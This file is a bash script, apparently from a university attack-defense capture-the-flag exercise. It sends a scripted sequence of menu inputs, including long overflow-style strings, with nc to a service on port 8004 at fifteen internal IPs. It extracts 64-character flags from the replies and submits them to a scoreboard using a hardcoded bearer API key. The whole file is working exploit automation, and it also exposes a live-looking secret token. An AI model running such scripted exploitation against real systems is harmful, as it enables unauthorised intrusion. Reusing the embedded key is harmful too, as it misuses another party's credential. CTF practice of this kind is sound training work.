#!/bin/bash

ips=(
    "10.219.255.2" "10.219.255.6" "10.219.255.14" "10.219.255.18"
    "10.219.255.22" "10.219.255.26" "10.219.255.30" "10.219.255.34"
    "10.219.255.38" "10.219.255.42" "10.219.255.46" "10.219.255.50"
    "10.219.255.54" "10.219.255.58" "10.219.255.62"
)

submit_url="https://ctf.hackintro25.di.uoa.gr/submit"
api_key="f99e197afa7122298b9b948accf205313ee28954a2af6a98710317f8dc80ea52"

for ip in "${ips[@]}"; do
    echo "[+] Connecting to $ip:8004"

    response=$( 
        {
        echo "2"
        sleep 0.5
        echo "2"
        sleep 0.5
        echo "myhorse"
        sleep 0.5
        echo "22222222222222222222222222222222222222222222222222"
        sleep 0.5
        echo "22222222222222222222222222222222222222222222222222"
        sleep 0.5
        echo "0"
        sleep 0.5
        echo "0"
        sleep 0.5
        echo "4"
        sleep 0.5
        echo "1"
        sleep 0.5
        echo "2"
        sleep 0.5
        } | nc "$ip" 8004 -w 3
    )

    if [[ "$response" =~ ([a-f0-9]{64}) ]]; then
        flag="${BASH_REMATCH[1]}"
        echo "[!] Flag found: $flag"

        submit_response=$(curl -s -w "%{http_code}" -o /tmp/submit_out \
            -H "Content-Type: application/json" \
            -H "Authorization: Bearer $api_key" \
            -d "{\"flag\": \"$flag\"}" \
            "$submit_url")

        if [[ "$submit_response" == "200" ]]; then
            echo "[✓] Flag submitted successfully!"
        else
            echo "[!] Submission failed: HTTP $submit_response"
            cat /tmp/submit_out
        fi
    else
        echo "[-] No valid flag found at $ip"
    fi
done